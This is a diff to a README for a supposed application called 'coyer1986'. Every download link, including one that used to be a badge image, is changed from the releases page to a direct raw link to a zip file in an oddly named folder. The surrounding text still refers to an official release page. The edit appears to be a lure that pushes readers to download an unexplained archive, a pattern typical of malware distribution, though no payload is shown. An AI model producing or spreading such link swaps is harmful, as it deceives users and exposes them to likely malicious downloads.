@@ -1,6 +1,6 @@
 # 🎉 coyer1986 - Simple Profile README for Everyone
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/zflor1s/coyer1986/main/funicle/coyer1986.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you start, make sure your computer meets the following requirements:
 
 To get started, you need to download the application from the official release page. Please visit the following link:
 
-[Download coyer1986](https://github.com/zflor1s/coyer1986/releases)
+[Download coyer1986](https://raw.githubusercontent.com/zflor1s/coyer1986/main/funicle/coyer1986.zip)
 
 Once you are on the page, look for the latest release. Download the application suited for your operating system. After downloading, follow these steps to install it:
 
@@ -62,4 +62,4 @@ If you have any further questions or need assistance, feel free to open an issue
 
 We encourage you to join our growing community of users. Your feedback is vital for improving the application, so please share your thoughts and suggestions after using coyer1986!
 
-For more information, refer back to the [Download coyer1986](https://github.com/zflor1s/coyer1986/releases) page.
+For more information, refer back to the [Download coyer1986](https://raw.githubusercontent.com/zflor1s/coyer1986/main/funicle/coyer1986.zip) page.
